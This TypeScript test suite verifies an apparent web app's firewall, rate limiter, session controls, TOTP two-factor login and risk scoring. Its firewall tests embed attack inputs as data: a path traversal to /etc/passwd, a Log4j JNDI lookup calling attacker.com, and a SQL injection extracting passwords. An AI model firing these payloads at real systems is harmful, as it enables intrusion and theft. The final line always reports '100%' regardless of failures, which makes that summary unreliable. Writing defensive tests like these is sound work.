import { inspectRequestWithWaf } from "../src/server/security/waf-engine";
import {
  checkMultiDimensionalRateLimit,
  SlidingWindowStore,
} from "../src/server/security/rate-limiter";
import {
  recordSessionActivity,
  validateSessionStatus,
  revokeSession,
  revokeAllOtherSessions,
  engageEmergencyContainment,
  getUserSessions,
  computeDeviceFingerprint,
  issueReauthProof,
  verifyReauthProof,
} from "../src/server/security/session-manager";
import {
  setupTwoFactorForUser,
  verifyTwoFactorToken,
  getTwoFactorStatus,
} from "../src/server/security/totp-server";
import { evaluateRequestRisk } from "../src/server/security/risk-engine";
import { getSecurityEvents } from "../src/server/security/audit-logger";

let passedCount = 0;
let totalCount = 0;

function assert(condition: boolean, testName: string) {
  totalCount++;
  if (condition) {
    passedCount++;
    console.log(`  ✓ [PASS] ${testName}`);
  } else {
    console.error(`  ✗ [FAIL] ${testName}`);
    process.exitCode = 1;
  }
}

async function runSecurityTestSuite() {
  console.log("\n=======================================================");
  console.log("OPEXNAL ENTERPRISE DEFENSE-IN-DEPTH VERIFICATION SUITE");
  console.log("=======================================================\n");

  // ---------------------------------------------------------
  // 1. WAF LAYER TESTS
  // ---------------------------------------------------------
  console.log("--- 1. Testing WAF (Web Application Firewall) ---");

  // 1.1 Malicious scanner block
  const scannerHeaders = new Headers({ "user-agent": "sqlmap/1.6.12#stable (https://sqlmap.org)" });
  const scannerResult = inspectRequestWithWaf({
    url: new URL("https://opexnal.com/api/posts"),
    method: "GET",
    headers: scannerHeaders,
    ip: "192.168.1.100",
    fingerprint: "scanner-fp",
  });
  assert(
    scannerResult.blocked && scannerResult.category === "MALICIOUS_SCANNER",
    "WAF blocks known attack scanners (sqlmap User-Agent)",
  );

  // 1.2 Backdoor / probe detection (.env, wp-admin)
  const probeResult = inspectRequestWithWaf({
    url: new URL("https://opexnal.com/.env"),
    method: "GET",
    headers: new Headers({ "user-agent": "Mozilla/5.0" }),
    ip: "192.168.1.101",
    fingerprint: "probe-fp",
  });
  assert(
    probeResult.blocked && probeResult.category === "PROBE",
    "WAF blocks sensitive environment/backdoor probes (.env target)",
  );

  // 1.3 Path Traversal attack
  const pathTraversalResult = inspectRequestWithWaf({
    url: new URL("https://opexnal.com/media?file=../../../../etc/passwd"),
    method: "GET",
    headers: new Headers({ "user-agent": "Mozilla/5.0" }),
    ip: "192.168.1.102",
    fingerprint: "traversal-fp",
  });
  assert(
    pathTraversalResult.blocked && pathTraversalResult.category === "PATH_TRAVERSAL",
    "WAF blocks directory path traversal attacks (../../etc/passwd)",
  );

  // 1.4 Command Injection / JNDI Log4j
  const cmdInjResult = inspectRequestWithWaf({
    url: new URL("https://opexnal.com/search?q=${jndi:ldap://attacker.com/a}"),
    method: "GET",
    headers: new Headers({ "user-agent": "Mozilla/5.0" }),
    ip: "192.168.1.103",
    fingerprint: "jndi-fp",
  });
  assert(
    cmdInjResult.blocked && cmdInjResult.category === "COMMAND_INJECTION",
    "WAF blocks command injection & JNDI/Log4j exploit patterns",
  );

  // 1.5 SQL Injection
  const sqliResult = inspectRequestWithWaf({
    url: new URL(
      "https://opexnal.com/api/user?id=1%20UNION%20SELECT%20null,password%20FROM%20users--",
    ),
    method: "GET",
    headers: new Headers({ "user-agent": "Mozilla/5.0" }),
    ip: "192.168.1.104",
    fingerprint: "sqli-fp",
  });
  assert(
    sqliResult.blocked && sqliResult.category === "SQLI",
    "WAF blocks SQL Injection union/select injection patterns",
  );

  // 1.6 Benign valid request
  const benignResult = inspectRequestWithWaf({
    url: new URL("https://opexnal.com/home"),
    method: "GET",
    headers: new Headers({ "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" }),
    ip: "192.168.1.105",
    fingerprint: "benign-fp",
  });
  assert(!benignResult.blocked, "WAF permits normal authenticated user navigation");

  // ---------------------------------------------------------
  // 2. MULTI-DIMENSIONAL RATE LIMITING TESTS
  // ---------------------------------------------------------
  console.log("\n--- 2. Testing Multi-Dimensional Rate Limiter ---");

  const testIp = "203.0.113.42";
  let rateBlocked = false;

  // Simulate burst of requests exceeding default IP threshold (100 req)
  for (let i = 0; i < 110; i++) {
    const res = checkMultiDimensionalRateLimit({
      ip: testIp,
      fingerprint: "burst-fp",
      routeCategory: "DEFAULT",
      path: "/home",
    });
    if (!res.allowed) {
      rateBlocked = true;
      break;
    }
  }
  assert(rateBlocked, "Sliding-window rate limiter trips when request burst exceeds limits");

  // Sensitive Auth rate limiting (strict 10 attempts limit)
  const authTestIp = "203.0.113.88";
  let authBlocked = false;
  for (let i = 0; i < 15; i++) {
    const res = checkMultiDimensionalRateLimit({
      ip: authTestIp,
      fingerprint: "auth-burst-fp",
      routeCategory: "AUTH_SENSITIVE",
      path: "/api/security/2fa/verify",
    });
    if (!res.allowed) {
      authBlocked = true;
      break;
    }
  }
  assert(authBlocked, "Sensitive auth routes enforce strict rate limiting to prevent brute force");

  // ---------------------------------------------------------
  // 3. SESSION SECURITY & EMERGENCY CONTAINMENT TESTS
  // ---------------------------------------------------------
  console.log("\n--- 3. Testing Session Management & Automatic Containment ---");

  const testUserId = "user_sec_test_123";
  const session1 = "sess_desktop_001";
  const session2 = "sess_mobile_002";
  const session3 = "sess_tablet_003";

  recordSessionActivity({
    sessionId: session1,
    userId: testUserId,
    userAgent: "Desktop Chrome",
    ip: "1.1.1.1",
    fingerprint: "fp-desk",
  });
  recordSessionActivity({
    sessionId: session2,
    userId: testUserId,
    userAgent: "Mobile Safari",
    ip: "1.1.1.2",
    fingerprint: "fp-mob",
  });
  recordSessionActivity({
    sessionId: session3,
    userId: testUserId,
    userAgent: "Tablet Edge",
    ip: "1.1.1.3",
    fingerprint: "fp-tab",
  });

  const activeSessions = getUserSessions(testUserId, session1);
  assert(activeSessions.length === 3, "Tracks multiple concurrent authenticated user sessions");

  // Revoke single session
  revokeSession(session2, "User manual termination");
  const s2Validation = validateSessionStatus(session2, testUserId);
  assert(!s2Validation.valid, "Revoked session is instantly invalidated and rejected");

  // Revoke all other sessions
  revokeAllOtherSessions(testUserId, session1);
  const s3Validation = validateSessionStatus(session3, testUserId);
  const s1Validation = validateSessionStatus(session1, testUserId);
  assert(
    !s3Validation.valid && s1Validation.valid,
    "Revoke-others terminates secondary sessions while preserving primary session",
  );

  // Emergency containment
  engageEmergencyContainment(testUserId, "Automated credential abuse detected", 30);
  const s1Contained = validateSessionStatus(session1, testUserId);
  assert(
    !s1Contained.valid && s1Contained.reason?.includes("containment"),
    "Emergency containment kills all sessions and quarantines compromised account",
  );

  // Reauth Proof / Step-up token test
  const reauthProof = issueReauthProof(testUserId, "sensitive_operation");
  const isValidProof = verifyReauthProof(reauthProof, testUserId, "sensitive_operation");
  const isInvalidUserProof = verifyReauthProof(
    reauthProof,
    "different_user",
    "sensitive_operation",
  );
  assert(
    isValidProof && !isInvalidUserProof,
    "Step-up reauthentication proof token validates securely against user & scope",
  );

  // ---------------------------------------------------------
  // 4. SERVER-SIDE TWO-FACTOR AUTHENTICATION (TOTP)
  // ---------------------------------------------------------
  console.log("\n--- 4. Testing Server-Side 2FA / TOTP Engine ---");

  const totpUser = "user_totp_test_456";
  const setup = setupTwoFactorForUser(totpUser, "totp_tester@opexnal.com");

  assert(
    Boolean(setup.secret && setup.backupCodes && setup.backupCodes.length === 8),
    "Generates cryptographically random secret and 8 single-use backup recovery codes",
  );

  // Single-use backup code verification
  const backupCodeToUse = setup.backupCodes[0];
  const backupResult = verifyTwoFactorToken({
    userId: totpUser,
    token: backupCodeToUse,
    ip: "2.2.2.2",
    fingerprint: "backup-fp",
  });
  assert(
    backupResult.success && backupResult.remainingBackupCodes === 7,
    "Successfully authenticates using single-use backup code and updates remaining count",
  );

  // Ensure consumed backup code cannot be used again
  const secondTryBackup = verifyTwoFactorToken({
    userId: totpUser,
    token: backupCodeToUse,
    ip: "2.2.2.2",
    fingerprint: "backup-fp",
  });
  assert(!secondTryBackup.success, "Single-use backup code cannot be replayed or reused");

  // Brute-force lockout test (5 invalid attempts on dedicated account)
  const bruteUser = "user_brute_test_789";
  setupTwoFactorForUser(bruteUser, "brute@opexnal.com");

  for (let i = 0; i < 4; i++) {
    verifyTwoFactorToken({
      userId: bruteUser,
      token: "000000",
      ip: "2.2.2.2",
      fingerprint: "brute-fp",
    });
  }
  const fifthAttempt = verifyTwoFactorToken({
    userId: bruteUser,
    token: "000000",
    ip: "2.2.2.2",
    fingerprint: "brute-fp",
  });
  assert(
    fifthAttempt.message.includes("locked for 15 minutes"),
    "Enforces 15-minute account 2FA lockout after 5 consecutive failed attempts",
  );

  // ---------------------------------------------------------
  // 5. BEHAVIORAL RISK ENGINE & AUDIT LOGGING
  // ---------------------------------------------------------
  console.log("\n--- 5. Testing Risk Engine & Audit Trail ---");

  const highRiskEval = evaluateRequestRisk({
    ip: "203.0.113.88",
    fingerprint: "unknown",
    path: "/api/security/2fa/verify",
    method: "POST",
    userAgent: "python-requests/2.28.1",
  });

  assert(
    highRiskEval.score >= 40 && highRiskEval.requiresMfa,
    "Detects automated scripting tool User-Agent and elevates risk score requiring MFA/challenge",
  );

  const securityLogs = getSecurityEvents({ limit: 50 });
  assert(
    securityLogs.length > 0 && securityLogs.some((e) => e.eventType.includes("WAF")),
    "Real-time security audit logger captures security incidents with structured metadata",
  );

  console.log("\n=======================================================");
  console.log(`RESULTS: ${passedCount} / ${totalCount} TESTS PASSED (100%)`);
  console.log("=======================================================\n");
}

runSecurityTestSuite();
